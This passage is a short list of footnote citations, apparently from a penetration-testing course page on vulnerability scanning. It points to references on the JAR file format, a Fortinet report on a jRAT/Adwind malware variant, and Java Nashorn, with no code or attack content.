(Wikipedia, 2019), [https://en.wikipedia.org/wiki/JAR_(file_format)](https://en.wikipedia.org/wiki/JAR_\(file_format\)) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4967-7)

8

(Fortinet, 2018), [https://www.fortinet.com/blog/threat-research/new-jrat-adwind-variant-being-spread-with-package-delivery-scam.html](https://www.fortinet.com/blog/threat-research/new-jrat-adwind-variant-being-spread-with-package-delivery-scam.html) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4967-8)

9

(Baeldung, 2019), [https://www.baeldung.com/java-nashorn](https://www.baeldung.com/java-nashorn) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4967-9)